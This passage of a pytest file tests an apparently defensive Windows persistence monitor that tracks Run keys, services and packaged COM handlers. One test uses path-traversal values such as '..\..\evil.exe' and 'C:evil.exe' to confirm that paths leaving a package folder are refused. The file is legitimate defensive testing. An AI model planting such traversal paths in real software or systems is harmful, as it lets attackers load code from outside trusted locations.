    with pytest.raises(ValueError, match="no longer there"):
        w.undo(key)


# ---- 0.4.2: entries Windows switches on and off by itself ---------------------------------------
def _svc(reg_base, name, start, image):
    with winreg.CreateKeyEx(HKCU, reg_base + rf"\Services\{name}", 0, winreg.KEY_WRITE) as k:
        winreg.SetValueEx(k, "ImagePath", 0, winreg.REG_EXPAND_SZ, image)
        winreg.SetValueEx(k, "Start", 0, winreg.REG_DWORD, start)


def test_service_flipping_between_automatic_and_manual_is_reported_once(settings, store, roots, reg_base,
                                                                        program):
    w = _watcher(settings, store, roots)
    w.scan_now()
    _svc(reg_base, "Flip", 2, f'"{program}" -k')
    assert w.scan_now() == ["service:Flip"]
    for _ in range(3):                     # Windows sets it to "when needed" and back, again and again
        _svc(reg_base, "Flip", 3, f'"{program}" -k')
        assert w.scan_now() == []
        assert store.get_persistence("service:Flip")["state"] == "new"     # still waiting for you
        _svc(reg_base, "Flip", 2, f'"{program}" -k')
        assert w.scan_now() == []
    assert len(_events(store)) == 1
    # a changed program while it was "when needed" is still news
    _svc(reg_base, "Flip", 3, f'"{program}" -x')
    w.scan_now()
    _svc(reg_base, "Flip", 2, f'"{program}" -x')
    assert w.scan_now() == ["service:Flip"]
    # switched off (4) or deleted counts as removed
    _svc(reg_base, "Flip", 4, f'"{program}" -x')
    w.scan_now()
    assert store.get_persistence("service:Flip")["state"] == "removed"


def test_entry_back_by_itself_reopens_the_same_alert(settings, store, roots, reg_base, program):
    run = reg_base + r"\Run"
    w = _watcher(settings, store, roots)
    w.scan_now()
    _set(run, "Blinky", f'"{program}"')
    w.scan_now()
    first = store.get_persistence("run:HKCU:Blinky")["event_id"]
    _delete_value(run, "Blinky")
    w.scan_now()
    assert store.get_guard_event(first)["action"] == "removed"
    _set(run, "Blinky", f'"{program}"')
    assert w.scan_now() == []                          # no second alert, no second pop-up
    row = store.get_persistence("run:HKCU:Blinky")
    assert row["state"] == "new" and row["event_id"] == first
    ev = store.get_guard_event(first)
    assert ev["state"] == "new" and ev["action"] == ""
    assert len(_events(store)) == 1
    # back with a different program: a new alert
    _delete_value(run, "Blinky")
    w.scan_now()
    _set(run, "Blinky", f'"{program}" --other')
    assert w.scan_now() == ["run:HKCU:Blinky"]
    assert len(_events(store)) == 2


def test_packaged_com_handler_is_found_only_inside_its_package(monkeypatch, tmp_path):
    clsid = "{F47D8C53-0B74-4A66-959D-367710AB1F84}"
    pkg = "Vendor.App_1.0.0.0_x64__abc"
    root = tmp_path / "SystemApps" / "Vendor.App"
    (root / "Task").mkdir(parents=True)
    (root / "Task" / "Task.exe").write_bytes(b"harmless test file\n")
    reg = {rf"{P._PKG_COM}\ClassIndex\{clsid}": {"subkeys": [pkg]},
           rf"{P._PKG_COM}\Package\{pkg}\Class\{clsid}": {"ServerId": 1},
           rf"{P._PKG_COM}\Package\{pkg}\Server\1": {"Executable": r"Task\Task.exe"}}
    opened = []

    class K:
        def __init__(self, path):
            self.path = path

        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

    def fake_open(hive, path, *a):
        opened.append((hive, path))
        if path not in reg:
            raise FileNotFoundError(path)
        return K(path)

    monkeypatch.setattr(P.winreg, "OpenKey", fake_open)
    monkeypatch.setattr(P, "_subkeys", lambda k: reg[k.path].get("subkeys", []))
    monkeypatch.setattr(P, "_query", lambda k, n: reg[k.path].get(n))
    monkeypatch.setattr(P, "package_path", lambda name: str(root) if name == pkg else "")
    assert P._com_dll(clsid) == str(root / "Task" / "Task.exe")
    # only the all-users registry is read for packaged COM
    assert all(h == winreg.HKEY_LOCAL_MACHINE for h, path in opened if "PackagedCom" in path)
    # a path that leaves the package folder, or an absolute one, is refused
    for bad in (r"..\..\evil.exe", str(tmp_path / "evil.exe"), r"C:evil.exe"):
        (tmp_path / "evil.exe").write_bytes(b"x")
        reg[rf"{P._PKG_COM}\Package\{pkg}\Server\1"] = {"Executable": bad}
        assert P._com_dll(clsid) == "", bad
    # a package Windows doesn't say is installed is not used
    reg[rf"{P._PKG_COM}\Package\{pkg}\Server\1"] = {"Executable": r"Task\Task.exe"}
    monkeypatch.setattr(P, "package_path", lambda name: "")
    assert P._com_dll(clsid) == ""
    assert P._com_dll("not a class id") == ""


def test_real_package_path():
    assert P.package_path("Not.A.Package_1.0.0.0_x64__nothing") == ""
    assert P.package_path("") == ""
